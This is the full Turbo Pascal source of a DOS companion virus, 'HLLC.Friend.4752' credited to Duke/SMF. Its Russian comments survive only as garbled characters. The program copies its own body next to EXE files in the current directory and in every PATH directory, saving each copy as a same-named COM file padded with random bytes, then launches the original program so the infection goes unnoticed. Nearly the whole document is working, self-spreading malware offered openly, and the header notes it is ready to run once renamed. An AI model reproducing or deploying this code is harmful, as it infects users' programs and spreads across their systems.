   {----------------------------------------------------------------------------
     *¥à¥¤ ¢ ¬¨ ¯à®áâ¥ìª¨© ¢¨àãá HLLC.Friend.4752
     *â® ä ©«®¢ë© ª®¬¯ ì® ¢¨àãá, ¯®à ¦ îé¨© EXE-ä ©«ë ¢ â¥ªãé¥¬ ª â «®£¥
     ¨ ¢ ª â «®£ å ¯¥à¥¬¥®© PATH.
     ƒ« ¢ë© ¯à¨ª®« á®áâ®¨â ¢ â®¬, çâ® ª®¬¯ ì®-¢¨àãáë ª ª ¯à ¢¨«®
      ¯¨á ë    áá¥¬¡«¥à¥, çâ®¡ë ®âª®¬¯¨«¨à®¢ ë© ¢¨àãá ¨¬¥« à áè¨à¥¨¥
     ¨¬¥¨ COM. ’®£¤  ® á¬®¦¥â ¯®à ¦ âì EXE-ä ©«ë, á®§¤ ¢ ï COM-ä ©« á¯ãâ¨ª.
     *® Turbo Pascal 7.1 ª®¬¯¨«¨àã¥â á¢®¨ ä ©«ë â®«ìª® ¢ ä®à¬ â EXE.
     “â¨«¨âë â¨¯  EXE2COM ¬®£ãâ ¡ëâì ¬ «®à¥§ã«ìâ â¨¢ë ¢ íâ®¬ á«ãç ¥, ¯®íâ®¬ã
     ï ¨á¯®«ì§ãî á¯®á®¡ ¯®¯à®é¥ - ¯¥à¥¨¬¥®¢ âì ®âª®¬¯¨«¨à®¢ ë© ¢¨àãá ¢
     ä ©« á à áè¨à¥¨¥¬ COM. ˆ íâ® ¢á¥ - ¢¨àãá £®â®¢ ª § ¯ãáªã !
     ‚¨àãá ¯®á«¥ ®ç¥à¥¤®£® § à ¦¥¨ï ¨§¬¥ï¥â ¤«¨ã ä ©«  § ¯¨áë¢ ¨¥¬
     ¢áïª®£® ¬ãá®à  ¢ ª®¥æ - ® ¥ ¢«¨ï¥â   à ¡®âã ¯à®£à ¬¬ë, ® ¢ ®¤®©
     ¤¨à¥ªâ®à¨¨ ¥ ¡ã¤¥â ¥áª®«ìª¨å COM-ä ©«®¢ á ®¤¨ ª®¢®© ¤«¨®©.
                                                Duke/SMF
   -----------------------------------------------------------------------------}
   {$M 5000, 0, 5000}
   uses dos;
   const virsize=4752;                    {„«¨  ®âª®¬¯¨«¨à®¢ ®£® ¢¨àãá }
         e='.EXE';
   var  ds:dirstr;
        ns:namestr;
        es:extstr;
        i:integer;
        f,g:file;
        mas:array[1..virsize] of char;    {â¥«® ¢¨àãá }
        st:string;
        par:string;                       {¯ à ¬¥âàë}
   {---------------------------------------------------------------------------}
   procedure zar(name:string);
   {‘®¡áâ¢¥® ¯®à ¦¥¨¥  ©¤¥ëå ä ©«®¢ á ¯à®¢¥àª®©   ¯®¢â®à®¥ § à ¦¥¨¥}
   var ch:char;
       g:file;
   begin
   fsplit(name,ds,ns,es);
   st:=ds+ns+'.com';
   assign(g,st);{$I-}reset(g);{$I+}
   if ioresult<>0 then                         {…éñ ¥ § à ¦¥}
     begin
     rewrite(g,1);
     blockwrite(g,mas,virsize);
     for i:=1 to random(500) do                {*¨è¥¬ ¬ãá®à:}
       begin
       ch:=chr(random(250));
       blockwrite(g,ch,1);
       end;
     end;
   close(g);
   end;
   {----------------------------------------------------------------------------}
   procedure Search(dir:string);  {¯®¨áª ¦¥àâ¢ ¢ ¤¨à¥ªâ®à¨¨ dir}
   var s:searchrec;
   begin
   findfirst(dir+'*'+e,$21,s);
   while doserror=0 do
     begin
     zar(s.name);
     findnext(s);
     end;
   end;
   {---------------------------------------------------------------------------}
   procedure Path;            {*®¨áª ¯® path}
   var num:integer;
       h:string;
   begin
   h:=GetEnv('PATH');
   if h='' then exit;
   num:=pos(';',h);
   while num<>0 do
     begin
     Search(copy(h,1,num-1)+'\');
     h:=copy(h,num+1,length(h)-num);
     num:=pos(';',h);
     end;
   Search(h);
   end;
   {----------------------------------------------------------------------------}
   begin
   st:='[Friend] by Duke/SMF';
   Randomize;
   assign(f,paramstr(0));reset(f,1);
   blockread(f,mas,virsize);
   close(f);
   fsplit(paramstr(0),ds,ns,es);
   st:=ds+ns+e;
   assign(g,st);{$I-}reset(g);{$I+}
   if (ioresult<>0) or (es=e) then Path {*¥  ©¤¥ ¯®à ¦¥ë© ä ©« ¨«¨ ¬ë ¢ EXE-ä ©«¥}
   else
     begin
     close(g);
     par:='';
     for i:=1 to paramcount do par:=par+paramstr(i)+' ';
     exec(st,par); {‡ ¯ãáâ¨«¨ ¯®à ¦¥ë© ä ©« á á®åà ¥¨¥¬ ¯ à ¬¥âà®¢ ª®¬. áâà®ª¨}
     end;
   Search('');                               {ˆ¤¥¬ ¯®à ¦ âì â¥ªãé¨© ª â «®£}
   end.
